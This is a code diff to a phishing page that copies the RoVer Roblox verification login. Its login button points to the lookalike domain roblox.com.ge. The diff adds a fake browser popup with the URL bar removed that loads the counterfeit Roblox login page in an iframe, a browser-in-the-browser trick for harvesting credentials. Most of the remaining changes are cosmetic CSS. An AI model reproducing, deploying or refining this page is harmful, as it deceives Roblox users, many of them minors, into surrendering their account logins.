@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RoVer – Login</title>
+  <title>ROBLOX</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
     html, body {
@@ -14,68 +14,82 @@
       color: #fff;
     }
 
-    /* Navbar */
+    /* Updated Navbar */
     nav {
-      background-color: #c91673;
+      background: linear-gradient(to right, #c91673, #a1125f);
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 12px 24px;
+      padding: 16px 32px;
       font-size: 18px;
       position: relative;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+      z-index: 10;
     }
 
-    .nav-left {
-      display: flex;
-      align-items: center;
-      gap: 20px;
-    }
-
+    .nav-left,
     .nav-right {
       display: flex;
       align-items: center;
-      gap: 16px;
-    }
-
-    .logo img {
-      height: 42px;
-      display: block;
+      gap: 24px;
     }
 
     nav a {
       color: #fff;
       text-decoration: none;
       font-size: 16px;
+      position: relative;
+      transition: color 0.2s ease;
+    }
+
+    nav a::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      bottom: -4px;
+      height: 2px;
+      width: 0;
+      background-color: #fff;
+      transition: width 0.3s ease;
+    }
+
+    nav a:hover::after {
+      width: 100%;
     }
 
     nav a:hover {
-      text-decoration: underline;
+      color: #ffdbf0;
     }
 
     .btn {
-      border: 1px solid #fff;
-      padding: 6px 12px;
-      border-radius: 6px;
-      background: none;
+      border: 2px solid #fff;
+      padding: 8px 16px;
+      border-radius: 8px;
+      background: transparent;
       color: #fff;
       font-size: 14px;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.2s ease;
-      white-space: nowrap;
+      transition: all 0.3s ease;
     }
 
     .btn:hover {
-      background-color: rgba(255, 255, 255, 0.15);
+      background-color: #fff;
+      color: #c91673;
+      box-shadow: 0 0 6px #fff;
+    }
+
+    .logo img {
+      height: 48px;
     }
 
     .username {
-      font-size: 14px;
-      font-weight: 700;
-      white-space: nowrap;
-      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      color: #ffffff;
+      opacity: 0.85;
     }
 
-    /* Hamburger */
     .hamburger {
       display: none;
       flex-direction: column;
@@ -90,21 +104,43 @@
       border-radius: 2px;
     }
 
-    /* Mobile menu */
     .mobile-menu {
       display: none;
       flex-direction: column;
-      gap: 12px;
       width: 100%;
-      padding: 12px 16px;
       background: #c91673;
+      padding: 12px 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.15);
     }
 
     .mobile-menu.open {
       display: flex;
     }
 
-    /* Header - center panel vertically */
+    @media (max-width: 768px) {
+      nav {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 12px 20px;
+      }
+
+      .hamburger {
+        display: flex;
+        margin-left: auto;
+      }
+
+      .nav-left,
+      .nav-right {
+        display: none;
+      }
+
+      .mobile-menu a,
+      .mobile-menu button {
+        margin-bottom: 10px;
+      }
+    }
+
+    /* Header & Panel */
     header {
       display: flex;
       flex-direction: column;
@@ -115,7 +151,6 @@
       text-align: center;
     }
 
-    /* Verification Panel */
     .panel {
       background: #000;
       border-radius: 8px;
@@ -140,7 +175,6 @@
       display: block;
     }
 
-    /* Info Box */
     .info-box {
       display: flex;
       align-items: flex-start;
@@ -148,7 +182,6 @@
       border-radius: 6px;
       padding: 10px 14px;
       margin: 0 0 20px;
-      text-align: left;
       width: 100%;
       box-sizing: border-box;
       overflow-wrap: break-word;
@@ -170,7 +203,6 @@
       line-height: 1.4;
     }
 
-    /* Login Button */
     .login-btn {
       margin-top: 20px;
       background: #c91673;
@@ -189,40 +221,68 @@
       background: #a1125f;
     }
 
-    /* Navbar behavior on mobile */
-    @media (max-width: 768px) {
-      .nav-left,
-      .nav-right {
-        display: none;
-      }
-
-      .hamburger {
-        display: flex;
-      }
+    /* Fake popup styles (url-bar removed) */
+    .fake-popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 700px;
+      height: 600px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+      overflow: hidden;
+      z-index: 1000;
+      border: 1px solid #ccc;
     }
 
-    /* Mobile adjustments */
-    @media (max-width: 600px) {
-      .panel {
-        padding: 20px 16px;
-      }
+    .window-bar {
+      background: #f7f7f7;
+      color: #111;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start; /* aligned left */
+      padding: 0 12px;
+      font-size: 14px;
+      font-weight: 700;
+      border-bottom: 1px solid #e0e0e0;
+      position: relative;
+    }
 
-      .panel h1 {
-        font-size: 22px;
-      }
+    .popup-close {
+      position: absolute;
+      right: 12px;
+      top: 6px;
+      font-size: 18px;
+      cursor: pointer;
+      color: #666;
+    }
 
-      .redirect-text {
-        font-size: 14px;
-      }
+    .popup-close:hover {
+      color: red;
+    }
 
-      .info-box p {
-        font-size: 14px;
-      }
+    .popup-iframe {
+      width: 100%;
+      /* only the window-bar height (36px) is taken, so subtract that */
+      height: calc(100% - 36px);
+      border: none;
+      display: block;
+      outline: none; /* removed white outline */
+    }
 
-      .login-btn {
-        font-size: 15px;
-        padding: 10px;
-      }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.65);
+      z-index: 999;
     }
   </style>
 </head>
@@ -240,14 +300,10 @@
     <div class="nav-right">
       <button class="btn">Manage Servers</button>
       <a href="#" style="font-weight: 700">Verification</a>
-      <span class="username"></span>
+      <span class="username">Guest</span>
     </div>
-
-    <!-- Hamburger -->
     <div class="hamburger" id="hamburger">
-      <span></span>
-      <span></span>
-      <span></span>
+      <span></span><span></span><span></span>
     </div>
   </nav>
 
@@ -258,7 +314,7 @@
     <button class="btn">RoVer Plus</button>
     <button class="btn">Manage Servers</button>
     <a href="#" style="font-weight: 700">Verification</a>
-    <span class="username"></span>
+    <span class="username">Guest</span>
   </div>
 
   <!-- Verification Panel -->
@@ -266,7 +322,6 @@
     <div class="panel" id="mockPanel">
       <h1>Link Roblox Account</h1>
       <span class="redirect-text">You will be redirected to Roblox.</span>
-
       <div class="info-box">
         <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
         <p>If the next page says:<br>
@@ -274,22 +329,49 @@
           <span style="color: #c91673;">this help article</span>.
         </p>
       </div>
-
       <button class="login-btn" id="loginBtn">Log in with Roblox</button>
     </div>
   </header>
+
+  <!-- Fake popup overlay -->
+  <div class="overlay" id="overlay"></div>
+
+  <!-- Fake browser popup (url-bar removed) -->
+  <div class="fake-popup" id="fakePopup">
+    <div class="window-bar">
+      ROBLOX
+      <div class="popup-close" id="popupClose">&times;</div>
+    </div>
+
+    <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
+  </div>
 
   <script>
     const loginBtn = document.getElementById("loginBtn");
     const hamburger = document.getElementById("hamburger");
     const mobileMenu = document.getElementById("mobileMenu");
 
-    // Redirect to Roblox login page
+    const fakePopup = document.getElementById("fakePopup");
+    const popupClose = document.getElementById("popupClose");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("popupIframe");
+
     loginBtn.addEventListener("click", () => {
-      window.location.href = "https://roblox.com.ge/login?returnUrl=2099296147452818";
+      // keep your real target if needed
+      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
+
+      iframe.src = realUrl;
+
+      fakePopup.style.display = "block";
+      overlay.style.display = "block";
     });
 
-    // Toggle mobile menu
+    popupClose.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
+    });
+
     hamburger.addEventListener("click", () => {
       mobileMenu.classList.toggle("open");
     });
